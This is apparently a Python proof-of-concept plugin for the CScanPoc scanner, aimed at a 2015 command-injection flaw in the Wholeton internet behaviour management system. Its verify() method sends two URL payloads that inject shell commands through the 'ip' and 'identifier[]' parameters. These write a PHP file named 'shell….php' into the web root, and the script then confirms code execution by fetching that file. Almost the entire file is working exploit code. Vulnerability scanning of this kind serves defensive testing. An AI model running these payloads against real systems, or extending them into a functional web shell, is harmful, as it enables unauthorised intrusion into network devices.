# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import random
import urllib.request
import urllib.parse
import urllib.error


class Vuln(ABVuln):
    vuln_id = 'Wholeton_0001'  # 平台漏洞编号，留空
    name = '惠尔顿上网行为管理系统 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-03-25'  # 漏洞公布时间
    desc = '''
        惠尔顿上网行为管理系统是由深圳市惠尔顿信息技术有限公司打造的一款上网行为管理检测系统。
        惠尔顿（Wholeton）上网行为管理系统多处命令执行漏洞：
        /base/stats/realtime/user_prohibit_internet.php
        /base/stats/realtime/underLineUser.php
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0103644'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '惠尔顿上网行为管理系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '093eb2d4-92e9-490d-8ee6-b7903ad837c2'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # No.1 http://www.wooyun.org/bugs/wooyun-2010-0103644
            payloads = [
                "/base/stats/realtime/user_prohibit_internet.php?ip=1.1.1.1;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
                "/base/stats/realtime/underLineUser.php?action=" +
                urllib.parse.quote(
                    '允许上网')+"&identifier[]=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
            ]
            for payload in payloads:
                filename = 'shell' + \
                    str(random.randint(1, 10000000000)) + '.php'
                target = self.target + payload + filename
                code, head, body, errcode, final_url = hh.http(target)
                if code == 404:
                    continue
                target2 = self.target + '/' + filename
                code, head, body, errcode, final_url = hh.http(target2)

                if 'c4ca4238a0b923820dcc509a6f75849' in body:
                    #security_hole(target+' ==getshell>> '+target2)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
